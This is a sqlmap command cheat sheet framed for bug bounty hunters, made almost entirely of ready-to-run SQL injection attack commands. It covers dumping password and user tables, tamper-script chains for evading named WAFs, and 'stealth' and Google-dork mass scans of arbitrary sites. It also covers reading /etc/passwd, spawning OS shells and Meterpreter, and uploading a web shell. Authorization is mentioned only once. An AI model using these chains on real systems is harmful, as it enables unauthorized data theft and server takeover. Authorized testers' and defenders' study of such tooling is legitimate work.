
SQLMAP COMPLETE COMMAND REFERENCE
For Bug Bounty Hunters & Security Researchers


TABLE OF CONTENTS
=================
1. Target Specification
2. Request Modification
3. Optimization & Performance
4. Injection Techniques
5. Enumeration (Data Extraction)
6. Database-Specific Commands
7. WAF Bypass & Tamper Scripts
8. Advanced & OS Access
9. Bug Bounty Pro-Mode Flags
10. Complete Workflow Examples

    
================================================================================
1. TARGET SPECIFICATION

Defining what you are attacking.
Basic URL Scan (GET parameter):
--------------------------------
sqlmap -u "http://site.com/page?id=1"

Using HTTP Request File (MOST COMMON FOR BUG BOUNTIES):
--------------------------------------------------------
sqlmap -r req.txt
- Loads raw HTTP request from file (saved from Burp Suite/ZAP)
- Best for complex POST requests or custom headers
- Save request in Burp: Right-click → Copy to file

Parse Proxy Log File:
---------------------
sqlmap -l burp.log
- Parses Burp/WebScarab proxy logs
- Scans all targets found in the log

Mass Scanning from URL List:
-----------------------------
sqlmap -m urls.txt
- Scans multiple URLs from a text file
- One URL per line

Google Dork Search (USE WITH CAUTION):
---------------------------------------
sqlmap -g "inurl:php?id="
- Automatically finds and tests targets using Google dorks
- Can trigger rate limiting
- Requires proper authorization

Test Specific Parameter:
------------------------
sqlmap -u "http://site.com/page?id=1&name=test" -p id
- Only tests the 'id' parameter

Skip Specific Parameters:
-------------------------
sqlmap -u "http://site.com/page?id=1&token=abc" --skip="token"
- Skips the 'token' parameter (useful for CSRF tokens)

Custom Injection Point (Asterisk marking):
------------------------------------------
sqlmap -u "http://site.com/page?id=1*"
- Marks exact injection point with *

================================================================================
2. REQUEST MODIFICATION
================================================================================
Tweaking how sqlmap talks to the server to bypass filters or maintain sessions.

Random User-Agent (Avoids sqlmap signature):
--------------------------------------------
sqlmap -u "http://site.com/page?id=1" --random-agent

Custom User-Agent:
------------------
sqlmap -u "http://site.com/page?id=1" --user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64)"

Session Cookie Authentication:
-------------------------------
sqlmap -u "http://site.com/page?id=1" --cookie="PHPSESSID=abc123; user=admin"

Custom Headers:
---------------
sqlmap -u "http://site.com/page?id=1" --header="Authorization: Bearer token123"

Multiple Custom Headers:
------------------------
sqlmap -u "http://site.com/page?id=1" --headers="Authorization: Bearer token\nX-Custom: value"

Proxy Routing (Monitor payloads in Burp):
-----------------------------------------
sqlmap -u "http://site.com/page?id=1" --proxy="http://127.0.0.1:8080"

SOCKS Proxy:
------------
sqlmap -u "http://site.com/page?id=1" --proxy="socks5://127.0.0.1:9050"

Tor Network Routing:
--------------------
sqlmap -u "http://site.com/page?id=1" --tor
sqlmap -u "http://site.com/page?id=1" --tor --check-tor

Force SSL/HTTPS:
----------------
sqlmap -u "http://site.com/page?id=1" --force-ssl

HTTP Authentication:
--------------------
sqlmap -u "http://site.com/page?id=1" --auth-type=Basic --auth-cred="user:pass"

POST Request:
-------------
sqlmap -u "http://site.com/page" --data="id=1&submit=true"

JSON POST Request:
------------------
sqlmap -u "http://site.com/api" --data='{"id":"1"}' --method=POST

Referer Header:
---------------
sqlmap -u "http://site.com/page?id=1" --referer="http://site.com/home"

================================================================================
3. OPTIMIZATION & PERFORMANCE
================================================================================
Commands to speed up scanning during time-constrained engagements.

Increase Concurrent Requests:
------------------------------
sqlmap -u "http://site.com/page?id=1" --threads=10
- Default is 1
- Max 10 is usually safe
- Higher threads = faster but more detectable

Persistent HTTP Connections:
----------------------------
sqlmap -u "http://site.com/page?id=1" --keep-alive

Retrieve Page Length Only (Saves bandwidth):
--------------------------------------------
sqlmap -u "http://site.com/page?id=1" --null-connection

Predict Common Output:
----------------------
sqlmap -u "http://site.com/page?id=1" --predict-output
- Reduces requests by predicting version names

Output Directory:
-----------------
sqlmap -u "http://site.com/page?id=1" --output-dir="/path/to/output"

Traffic Log:
------------
sqlmap -u "http://site.com/page?id=1" -t traffic.log

Verbose Output:
---------------
sqlmap -u "http://site.com/page?id=1" -v 3
- Levels: 0-6 (0=minimal, 6=maximum)

================================================================================
4. INJECTION TECHNIQUES
================================================================================
Specifying or limiting the type of SQL injection to test.

Specify Injection Techniques:
------------------------------
sqlmap -u "http://site.com/page?id=1" --technique=BEUSTQ

Technique Types:
- B = Boolean-based blind
- E = Error-based
- U = Union query-based
- S = Stacked queries
- T = Time-based blind
- Q = Inline queries

Example - Only test Boolean and Time-based:
sqlmap -u "http://site.com/page?id=1" --technique=BT

Time-Based Delay Configuration:
--------------------------------
sqlmap -u "http://site.com/page?id=1" --time-sec=5
- Sets seconds to delay DBMS response (Default: 5)
- Increase for slow networks: --time-sec=10

Testing Depth Level:
--------------------
sqlmap -u "http://site.com/page?id=1" --level=5

Level Details:
- Level 1: Basic GET parameters (Default)
- Level 2: Tests Cookie headers
- Level 3: Tests User-Agent/Referer headers  
- Level 4: Deeper parameter testing
- Level 5: Tests Host headers, deepest inspection

Risk Level:
-----------
sqlmap -u "http://site.com/page?id=1" --risk=3

Risk Details:
- Risk 1: Safe tests (Default)
- Risk 2: Adds heavy time-based tests
- Risk 3: Adds OR-based tests (can be destructive to data)

Combined Aggressive Testing:
----------------------------
sqlmap -u "http://site.com/page?id=1" --level=5 --risk=3

Union Columns:
--------------
sqlmap -u "http://site.com/page?id=1" --union-cols=10
- Manually set UNION column range

Union Character:
----------------
sqlmap -u "http://site.com/page?id=1" --union-char="a"

================================================================================
5. ENUMERATION (DATA EXTRACTION)
================================================================================
Once an injection is found, these commands extract data.

Get DBMS Banner/Version:
------------------------
sqlmap -u "http://site.com/page?id=1" --banner

Get Current Database User:
--------------------------
sqlmap -u "http://site.com/page?id=1" --current-user

Get Current Database Name:
--------------------------
sqlmap -u "http://site.com/page?id=1" --current-db

Check DBA Privileges:
---------------------
sqlmap -u "http://site.com/page?id=1" --is-dba

List All Database Users:
------------------------
sqlmap -u "http://site.com/page?id=1" --users

List User Passwords:
--------------------
sqlmap -u "http://site.com/page?id=1" --passwords

List User Privileges:
---------------------
sqlmap -u "http://site.com/page?id=1" --privileges

List All Databases:
-------------------
sqlmap -u "http://site.com/page?id=1" --dbs

List Tables in Specific Database:
----------------------------------
sqlmap -u "http://site.com/page?id=1" --tables -D database_name

List All Tables (All Databases):
--------------------------------
sqlmap -u "http://site.com/page?id=1" --tables

List Columns in Specific Table:
--------------------------------
sqlmap -u "http://site.com/page?id=1" --columns -D database_name -T table_name

Dump Specific Columns:
----------------------
sqlmap -u "http://site.com/page?id=1" -D database_name -T table_name -C "username,password" --dump

Dump Specific Table:
--------------------
sqlmap -u "http://site.com/page?id=1" --dump -D database_name -T table_name

Dump Specific Database:
-----------------------
sqlmap -u "http://site.com/page?id=1" --dump -D database_name

Dump Everything (Time consuming):
----------------------------------
sqlmap -u "http://site.com/page?id=1" --dump-all

Exclude System Databases:
-------------------------
sqlmap -u "http://site.com/page?id=1" --dump-all --exclude-sysdbs

Search for Specific Columns:
-----------------------------
sqlmap -u "http://site.com/page?id=1" --search -C user,pass
- Searches for columns named 'user' or 'pass' across all tables

Search for Specific Tables:
---------------------------
sqlmap -u "http://site.com/page?id=1" --search -T users

Search for Specific Databases:
------------------------------
sqlmap -u "http://site.com/page?id=1" --search -D admin

Count Table Entries:
--------------------
sqlmap -u "http://site.com/page?id=1" -D database_name -T table_name --count

Start/Stop Dump at Row:
-----------------------
sqlmap -u "http://site.com/page?id=1" -D db -T table --start=1 --stop=100

First/Last Character Position:
-------------------------------
sqlmap -u "http://site.com/page?id=1" -D db -T table --first=1 --last=10

Pivot Column:
-------------
sqlmap -u "http://site.com/page?id=1" -D db -T table --pivot-column=id

================================================================================
6. DATABASE-SPECIFIC COMMANDS
================================================================================
While sqlmap auto-detects DBMS, manual specification speeds up attacks.

Specify Database Type:
----------------------
sqlmap -u "http://site.com/page?id=1" --dbms=mysql
sqlmap -u "http://site.com/page?id=1" --dbms=postgresql
sqlmap -u "http://site.com/page?id=1" --dbms=mssql
sqlmap -u "http://site.com/page?id=1" --dbms=oracle
sqlmap -u "http://site.com/page?id=1" --dbms=sqlite

Supported DBMS:
- MySQL
- PostgreSQL
- Microsoft SQL Server
- Oracle
- SQLite
- Microsoft Access
- Firebird
- SAP MaxDB
- Sybase
- IBM DB2

--- MYSQL / MARIADB ---
------------------------

MySQL is the most common target with specific syntax exploitation.

Basic MySQL Scan:
sqlmap -u "http://site.com/page?id=1" --dbms=mysql

MySQL-Specific Flags:
sqlmap -u "http://site.com/page?id=1" --dbms=mysql --no-cast --hex

--no-cast: Prevents use of CAST() function (some WAFs flag this)
--hex: Retrieves data in hexadecimal to avoid character encoding issues

MySQL Tamper Scripts:
sqlmap -u "http://site.com/page?id=1" --dbms=mysql
--tamper="versionedmorekeywords,space2comment,between"

versionedmorekeywords.py: Adds version comments (e.g., /*!SELECT*/)
space2comment.py: Replaces spaces with /**/
between.py: Replaces > or < with BETWEEN

MySQL Complete Example:
sqlmap -r request.txt --dbms=mysql --tamper="versionedmorekeywords,space2comment" --hex --no-cast --batch

--- POSTGRESQL ---
------------------

PostgreSQL handles casting and string concatenation (||) differently.

Basic PostgreSQL Scan:
sqlmap -u "http://site.com/page?id=1" --dbms=postgresql

PostgreSQL-Specific Flags:
sqlmap -u "http://site.com/page?id=1" --dbms=postgresql --no-escape

--no-escape: Turns off string escaping (uses $$ quoting instead)

PostgreSQL Tamper Scripts:
sqlmap -u "http://site.com/page?id=1" --dbms=postgresql --tamper="space2pgcomment,xforwardedfor,between"

space2pgcomment.py: PostgreSQL-style comment replacement /**/
xforwardedfor.py: Injects payloads into X-Forwarded-For header
between.py: Effective for PostgreSQL

PostgreSQL Complete Example:
sqlmap -r request.txt --dbms=postgresql --no-escape --tamper="space2pgcomment,between" --batch

--- MICROSOFT SQL SERVER (MSSQL) ---
------------------------------------

MSSQL has strict syntax but powerful capabilities (often runs as SYSTEM).

Basic MSSQL Scan:
sqlmap -u "http://site.com/page?id=1" --dbms=mssql

MSSQL with OS Access:
sqlmap -u "http://site.com/page?id=1" --dbms=mssql --os-shell
- MSSQL often allows enabling xp_cmdshell for RCE

MSSQL Tamper Scripts:
sqlmap -u "http://site.com/page?id=1" --dbms=mssql --tamper="space2mysqldash,charencode,plus2fnconcat"

space2mysqldash.py: Replaces space with -- followed by newline
charencode.py: URL encodes the payload
plus2fnconcat.py: Replaces + (concatenation) with {fn CONCAT()}

MSSQL Complete Example:
sqlmap -r request.txt --dbms=mssql --tamper="space2mysqldash,charencode" --os-shell --batch

--- ORACLE ---
--------------

Oracle is challenging due to strict typing and lack of LIMIT (uses ROWNUM).

Basic Oracle Scan:
sqlmap -u "http://site.com/page?id=1" --dbms=oracle

Oracle-Specific Flags:
sqlmap -u "http://site.com/page?id=1" --dbms=oracle --no-cast

--no-cast: Oracle is very sensitive to casting errors

Oracle Tamper Scripts:
sqlmap -u "http://site.com/page?id=1" --dbms=oracle --tamper="greatest,space2comment"

greatest.py: Replaces > with GREATEST() function
space2comment.py: Standard whitespace evasion

Oracle Complete Example:
sqlmap -r request.txt --dbms=oracle --no-cast --tamper="greatest,space2comment" --batch

================================================================================
7. WAF BYPASS & TAMPER SCRIPTS
================================================================================
Modern WAFs (Cloudflare, AWS WAF, Akamai) block SQL keywords using signatures.
Tamper scripts obfuscate payloads while maintaining execution.

--- STRATEGY A: OBFUSCATION (TAMPER SCRIPTS) ---

Chain Multiple Tamper Scripts:
-------------------------------
sqlmap -u "http://site.com/page?id=1" --tamper="space2comment,between,charencode"

COMPREHENSIVE TAMPER SCRIPT REFERENCE:
---------------------------------------

General Purpose Tampers:
------------------------
space2comment.py
- Replaces spaces with /**/
- Example: SELECT * → SELECT/**/
- Usage: --tamper="space2comment"

between.py
- Replaces comparison operators
- Example: ID > 5 → ID NOT BETWEEN 0 AND 5
- Usage: --tamper="between"

charencode.py
- URL encodes keywords
- Example: SELECT → %53%45%4C%45%43%54
- Usage: --tamper="charencode"

equaltolike.py
- Replaces equals operator
- Example: ID = 1 → ID LIKE 1
- Usage: --tamper="equaltolike"

randomcase.py
- Randomizes case
- Example: UNION SELECT → uNiOn SeLeCt
- Usage: --tamper="randomcase"

apostrophemask.py
- Replaces apostrophe with UTF-8 equivalent
- Example: ' → %EF%BC%87
- Usage: --tamper="apostrophemask"

apostrophenullencode.py
- Replaces apostrophe with illegal double unicode
- Example: ' → %00%27
- Usage: --tamper="apostrophenullencode"

appendrandomstring.py
- Appends random string to each keyword
- Usage: --tamper="appendrandomstring"

Database-Specific Tampers:
--------------------------
versionedmorekeywords.py (MySQL)
- Adds version comments
- Example: SELECT → /*!SELECT*/
- Usage: --tamper="versionedmorekeywords"

space2mysqldash.py (MSSQL)
- Replaces space with -- followed by newline
- Usage: --tamper="space2mysqldash"

space2pgcomment.py (PostgreSQL)
- PostgreSQL-style comment replacement
- Usage: --tamper="space2pgcomment"

greatest.py (Oracle)
- Replaces > with GREATEST() function
- Usage: --tamper="greatest"

WAF-Specific Tampers:
---------------------
charunicodeencode.py (Cloudflare/AWS)
- Uses Unicode evasion
- Example: SELECT → %u0053%u0045...
- Usage: --tamper="charunicodeencode"

bluecoat.py (BlueCoat WAF)
- Replaces space with valid random blank characters
- Usage: --tamper="bluecoat"

base64encode.py (Specific Apps)
- Encodes entire payload in Base64
- Only works if app decodes it
- Usage: --tamper="base64encode"

xforwardedfor.py
- Injects payloads into X-Forwarded-For header
- Usage: --tamper="xforwardedfor"

Advanced Tampers:
-----------------
plus2concat.py
- Replaces plus with concat function
- Usage: --tamper="plus2concat"

plus2fnconcat.py
- Replaces + with {fn CONCAT()}
- Usage: --tamper="plus2fnconcat"

space2dash.py
- Replaces space with -- and newline
- Usage: --tamper="space2dash"

space2hash.py
- Replaces space with # and newline
- Usage: --tamper="space2hash"

space2morecomment.py
- Replaces space with /**_**/
- Usage: --tamper="space2morecomment"

space2morehash.py
- Replaces space with #, random string, newline
- Usage: --tamper="space2morehash"

space2mssqlblank.py
- Replaces space with random blank character
- Usage: --tamper="space2mssqlblank"

space2mssqlhash.py
- Replaces space with %23%0A
- Usage: --tamper="space2mssqlhash"

space2mysqlblank.py
- Replaces space with alternative characters
- Usage: --tamper="space2mysqlblank"

space2plus.py
- Replaces space with +
- Usage: --tamper="space2plus"

space2randomblank.py
- Replaces space with random blank character
- Usage: --tamper="space2randomblank"

symboliclogical.py
- Replaces AND/OR with && and ||
- Usage: --tamper="symboliclogical"

unionalltounion.py
- Replaces UNION ALL SELECT with UNION SELECT
- Usage: --tamper="unionalltounion"

unmagicquotes.py
- Replaces quote with multibyte combo
- Usage: --tamper="unmagicquotes"

Skip WAF Detection:
-------------------
sqlmap -u "http://site.com/page?id=1" --skip-waf
- Saves time if you know there's no WAF

Identify WAF:
-------------
sqlmap -u "http://site.com/page?id=1" --identify-waf

Add Delay Between Requests:
----------------------------
sqlmap -u "http://site.com/page?id=1" --delay=2
- Helps avoid rate-limiting and detection
- Delay in seconds

Safe URL:
---------
sqlmap -u "http://site.com/page?id=1" --safe-url="http://site.com/safe" --safe-freq=3
- Visits safe URL every X requests to maintain session

--- STRATEGY B: PROTOCOL LEVEL EVASION ---

HTTP Parameter Pollution (HPP):
--------------------------------
sqlmap -u "http://site.com/page?id=1" --hpp
- Splits payload across multiple parameters
- Effect: id=1 UNION SELECT... → id=1&id=UNION&id=SELECT...
- Works best on ASP/IIS servers
- WAFs often only check first parameter

Chunked Encoding:
-----------------
sqlmap -u "http://site.com/page" --data="id=1" --chunked
- Splits HTTP request body into chunks
- Only works for POST requests
- Many WAFs fail to reassemble chunks

Delay / Throttling:
-------------------
sqlmap -u "http://site.com/page?id=1" --delay=2 --random-agent
- --delay=2: Wait 2 seconds between requests
- --random-agent: Rotate User-Agent to appear as different users

Advanced Throttling:
--------------------
sqlmap -u "http://site.com/page?id=1" --delay=3 --threads=2 --random-agent --time-sec=10

--- STRATEGY C: HEADER INJECTION ---

Test Cookie and Referer Headers:
---------------------------------
sqlmap -u "http://site.com/page?id=1" --level=3 --risk=2
- Level 3: Checks User-Agent and Referer headers

Test All Headers Including Host:
---------------------------------
sqlmap -u "http://site.com/page?id=1" --level=5 --risk=3
- Level 5: Checks Host and Cookie headers (deepest)

Specific Header Injection (Cookie):
------------------------------------
sqlmap -u "http://site.com/page" --cookie="session=abc123*" --level=2
- The * marks injection point

Custom Header Injection:
------------------------
sqlmap -u "http://site.com/page" --header="X-Forwarded-For: 127.0.0.1*" --level=3

EXAMPLE WAF BYPASS COMBINATIONS:
---------------------------------

Cloudflare Bypass:
sqlmap -r request.txt --dbms=mysql --tamper="space2comment,between,charunicodeencode,randomcase" --random-agent --delay=2 --level=3 --risk=2 --threads=3 --batch

AWS WAF Bypass:
sqlmap -r request.txt --tamper="space2comment,equaltolike,charencode" --random-agent --delay=3 --chunked --level=5 --risk=3 --batch

Generic WAF Bypass:
sqlmap -r request.txt --tamper="space2comment,between,randomcase" --random-agent --delay=2 --batch

Akamai Bypass:
sqlmap -r request.txt --tamper="space2comment,charencode,randomcase,between" --random-agent --hpp --delay=2 --level=4 --batch

Incapsula Bypass:
sqlmap -r request.txt --tamper="space2comment,between,charunicodeencode" --random-agent --delay=3 --safe-url="http://site.com/" --safe-freq=2 --batch

ModSecurity Bypass:
sqlmap -r request.txt --tamper="space2comment,between,versionedmorekeywords" --random-agent --delay=1 --batch

================================================================================
8. ADVANCED & OS ACCESS
================================================================================
If you have DBA privileges, you can escalate to the Operating System.

Interactive OS Shell (RCE):
---------------------------
sqlmap -u "http://site.com/page?id=1" --os-shell
- Requires DBA privileges
- Commonly works with MSSQL (xp_cmdshell)

Execute Single OS Command:
--------------------------
sqlmap -u "http://site.com/page?id=1" --os-cmd="whoami"

Out-of-Band Shell/Meterpreter:
-------------------------------
sqlmap -u "http://site.com/page?id=1" --os-pwn
- Prompts for Meterpreter or VNC

Read File from Server:
----------------------
sqlmap -u "http://site.com/page?id=1" --file-read="/etc/passwd"
sqlmap -u "http://site.com/page?id=1" --file-read="C:\Windows\System32\drivers\etc\hosts"

Upload File to Server:
----------------------
sqlmap -u "http://site.com/page?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"

Interactive SQL Console:
------------------------
sqlmap -u "http://site.com/page?id=1" --sql-shell

Execute SQL Query:
------------------
sqlmap -u "http://site.com/page?id=1" --sql-query="SELECT @@version"

Registry Operations (Windows):
------------------------------
sqlmap -u "http://site.com/page?id=1" --reg-read
sqlmap -u "http://site.com/page?id=1" --reg-add
sqlmap -u "http://site.com/page?id=1" --reg-del
sqlmap -u "http://site.com/page?id=1" --reg-key="HKEY_LOCAL_MACHINE\SOFTWARE"

================================================================================
9. BUG BOUNTY PRO-MODE FLAGS
================================================================================
Combinations often used to automate or handle tricky scenarios.

Batch Mode (No user prompts - ESSENTIAL):
-----------------------------------------
sqlmap -u "http://site.com/page?id=1" --batch
- Never asks for user input
- Uses default behavior
- Essential for automated scanning

Smart Scanning:
---------------
sqlmap -u "http://site.com/page?id=1" --smart
- Performs thorough tests only if positive heuristics found
- Great for mass scanning

Parse and Test HTML Forms:
--------------------------
sqlmap -u "http://site.com/page" --forms
- Automatically finds and tests forms

Crawl Website:
--------------
sqlmap -u "http://site.com/" --crawl=3
- Crawls website to depth of 3
- Tests all found endpoints

Parse DBMS Error Messages:
--------------------------
sqlmap -u "http://site.com/page?id=1" --parse-errors
- Helps identify database type quickly

Second-Order Injection Testing:
-------------------------------
sqlmap -u "http://site.com/page?id=1" --second-url="http://site.com/profile"
- Attacks URL A but checks URL B for result

Second-Order with Request File:
-------------------------------
sqlmap -r request.txt --second-req="second.txt"

Fresh Queries (Ignore cache):
-----------------------------
sqlmap -u "http://site.com/page?id=1" --fresh-queries
- Ignore local session/cache
- Re-run all queries

Flush Session Completely:
-------------------------
sqlmap -u "http://site.com/page?id=1" --flush-session
- Resets everything and starts fresh

Answers:
--------
sqlmap -u "http://site.com/page?id=1" --answers="crack=N,dict=N,continue=Y"
- Pre-define answers to questions

Mobile User-Agent:
------------------
sqlmap -u "http://site.com/page?id=1" --mobile

Hostname:
---------
sqlmap -u "http://site.com/page?id=1" --hostname

CSV Output:
-----------
sqlmap -u "http://site.com/page?id=1" --dump --csv-del=";"

Alert on SQL Injection:
-----------------------
sqlmap -u "http://site.com/page?id=1" --alert="beep"

Disable Coloring:
-----------------
sqlmap -u "http://site.com/page?id=1" --disable-coloring

Test Filter:
------------
sqlmap -u "http://site.com/page?id=1" --test-filter="ROW"
- Only run tests with ROW in title

Test Skip:
----------
sqlmap -u "http://site.com/page?id=1" --test-skip="BENCHMARK"
- Skip tests with BENCHMARK

ETA Display:
------------
sqlmap -u "http://site.com/page?id=1" --eta

Update SQLMap:
--------------
sqlmap --update

Purge Output Directory:
-----------------------
sqlmap --purge

Check Dependencies:
-------------------
sqlmap --dependencies

================================================================================
10. COMPLETE WORKFLOW EXAMPLES
================================================================================

--- BASIC WORKFLOWS ---

Quick Vulnerability Check:
--------------------------
sqlmap -u "http://site.com/page?id=1" --batch --smart

Standard Bug Bounty Scan:
-------------------------
sqlmap -r request.txt --batch --random-agent --level=2 --risk=2

Authenticated Web Application:
------------------------------
sqlmap -r request.txt --cookie="session=abc123" --batch --random-agent

POST Request with JSON:
-----------------------
sqlmap -u "http://site.com/api" --data='{"id":"1"}' --method=POST --batch

--- WAF BYPASS WORKFLOWS ---

Cloudflare Bypass Complete:
---------------------------
sqlmap -r request.txt \
  --dbms=mysql \
  --tamper="space2comment,between,charunicodeencode,randomcase" \
  --random-agent \
  --delay=2 \
  --level=3 \
  --risk=2 \
  --threads=3 \
  --batch

AWS WAF Bypass Complete:
------------------------
sqlmap -r request.txt \
  --tamper="space2comment,equaltolike,charencode" \
  --random-agent \
  --delay=3 \
  --chunked \
  --level=5 \
  --risk=3 \
  --batch

Akamai Bypass:
--------------
sqlmap -r request.txt \
  --tamper="space2comment,charencode,randomcase,between" \
  --random-agent \
  --hpp \
  --delay=2 \
  --level=4 \
  --batch

--- DATABASE-SPECIFIC WORKFLOWS ---

MySQL Complete Enumeration:
---------------------------
sqlmap -r request.txt \
  --dbms=mysql \
  --tamper="versionedmorekeywords,space2comment" \
  --hex \
  --no-cast \
  --batch \
  --dbs \
  --tables \
  --columns

PostgreSQL Deep Scan:
---------------------
sqlmap -r request.txt \
  --dbms=postgresql \
  --no-escape \
  --tamper="space2pgcomment,between" \
  --batch \
  --current-db \
  --tables \
  --dump

MSSQL with OS Access:
---------------------
sqlmap -r request.txt \
  --dbms=mssql \
  --tamper="space2mysqldash,charencode" \
  --batch \
  --is-dba \
  --os-shell

Oracle Exploitation:
--------------------
sqlmap -r request.txt \
  --dbms=oracle \
  --tamper="greatest,space2comment" \
  --no-cast \
  --batch \
  --level=5 \
  --risk=2

--- ADVANCED WORKFLOWS ---

Header-Based Injection:
sqlmap -u "http://site.com/page" 
--level=5 
--risk=3 
--tamper="space2comment,charencode,randomcase" 
--random-agent 
--cookie="PHPSESSID=abc123" 
--header="X-Forwarded-For: 192.168.1.1" 
--delay=2 
--batch

Second-Order Injection:
sqlmap -r register.txt 
--second-url="http://site.com/profile" 
--batch 
--level=3 
--risk=2

Mass Scanning:
sqlmap -m urls.txt 
--batch 
--smart 
--threads=5 
--random-agent 
--output-dir="./results"

Complete Data Extraction:
Step 1: Find injection
sqlmap -r request.txt --batch --smart
Step 2: Enumerate databases
sqlmap -r request.txt --batch --dbs
Step 3: Get tables
sqlmap -r request.txt --batch -D database_name --tables
Step 4: Get columns
sqlmap -r request.txt --batch -D database_name -T users --columns
Step 5: Dump data
sqlmap -r request.txt --batch -D database_name -T users -C "username,password,email" --dump

Stealth Scan (Slow but undetectable):
sqlmap -r request.txt 
--batch 
--random-agent 
--delay=5 
--threads=1 
--tamper="space2comment,randomcase" 
--level=3 
--risk=2 
--technique=T

Aggressive Scan (Fast but noisy):
sqlmap -r request.txt 
--batch 
--random-agent 
--threads=10 
--level=5 
--risk=3 
--tamper="space2comment"

Through Proxy with Monitoring:
sqlmap -r request.txt 
--proxy="http://127.0.0.1:8080" 
--batch 
--tamper="space2comment" 
--level=3 
--risk=2 
-v 3 
-t traffic.log

Form-Based Testing:
sqlmap -u "http://site.com/login.php" 
--forms 
--batch 
--random-agent 
--level=3 
--risk=2

Crawl and Test Entire Site:
sqlmap -u "http://site.com/" 
--crawl=3 
--forms 
--batch 
--smart 
--random-agent 
--level=2 
--exclude-sysdbs

Google Dork Mass Test:
sqlmap -g "inurl:.php?id=" 
--batch 
--smart 
--random-agent 
--threads=3 
--output-dir="./dork_results"

API Testing:
sqlmap -u "http://api.site.com/v1/users" 
--method=POST 
--data='{"id":"1*"}' 
--headers="Content-Type: application/json\nAuthorization: Bearer token123" 
--batch 
--random-agent

GraphQL Injection:
sqlmap -u "http://site.com/graphql" 
--data='{"query":"query{user(id:1*){name}}"}' 
--method=POST 
--headers="Content-Type: application/json" 
--batch

Cookie-Based Injection Complete:
sqlmap -u "http://site.com/dashboard" 
--cookie="user_id=1*; session=abc" 
--level=2 
--batch 
--random-agent 
--tamper="space2comment"

Time-Based Blind Complete:
sqlmap -r request.txt 
--technique=T 
--time-sec=5 
--batch 
--threads=1 
--delay=1 
--tamper="space2comment"

Boolean-Based Blind Complete:
sqlmap -r request.txt 
--technique=B 
--batch 
--threads=5 
--tamper="space2comment,between"

Union-Based Injection:
sqlmap -r request.txt 
--technique=U 
--batch 
--union-cols=10 
--tamper="space2comment"

Error-Based Injection:
sqlmap -r request.txt 
--technique=E 
--parse-errors 
--batch 
--tamper="space2comment"

--- ESCALATION WORKFLOWS ---

From SQLi to Shell:
Step 1: Confirm DBA
sqlmap -r request.txt --batch --is-dba
Step 2: Read sensitive files
sqlmap -r request.txt --batch --file-read="/etc/passwd"
Step 3: Get OS shell
sqlmap -r request.txt --batch --os-shell
Step 4: Upload web shell
sqlmap -r request.txt --batch --file-write="shell.php" --file-dest="/var/www/html/s.php"

Complete Privilege Escalation:
sqlmap -r request.txt 
--batch 
--current-user 
--is-dba 
--privileges 
--passwords 
--dbs 
--users

Windows Registry Access:
sqlmap -r request.txt 
--batch 
--dbms=mssql 
--reg-read 
--reg-key="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion"

COMMON COMBINATIONS:
##Basic bug bounty
sqlmap -r req.txt --batch --random-agent --level=2 --risk=2
##WAF bypass
sqlmap -r req.txt --tamper="space2comment,between" --random-agent --delay=2 --batch
##Complete enumeration
sqlmap -r req.txt --batch --dbs --tables --columns --dump
##Stealth scan
sqlmap -r req.txt --batch --delay=5 --threads=1 --random-agent
##MySQL specific
sqlmap -r req.txt --dbms=mysql --tamper="versionedmorekeywords,space2comment" --hex --batch
##Through proxy
sqlmap -r req.txt --proxy="http://127.0.0.1:8080" --batch
##Forms testing
sqlmap -u "http://site.com/" --forms --batch --random-agent
##Mass scanning
sqlmap -m urls.txt --batch --smart --threads=5
WORKFLOW:
1.	Save request from Burp: Right-click → Copy to file
2.	Run: sqlmap -r request.txt --batch --smart
3.	If found: sqlmap -r request.txt --batch --dbs
4.	Enumerate: sqlmap -r request.txt -D dbname --tables
5.	Dump: sqlmap -r request.txt -D dbname -T users --dump
PRO TIPS:
•	Always use --batch for automation
•	Start with --smart flag for efficiency
•	Use --level=5 --risk=3 for complete testing
•	Monitor traffic with --proxy and Burp
•	Use tamper scripts for WAF bypass
•	Specify --dbms when known for speed
•	Use --threads=5 for faster scanning
•	Add --delay for stealth
•	Save output with --output-dir
•	Use -v 3 for verbose debugging

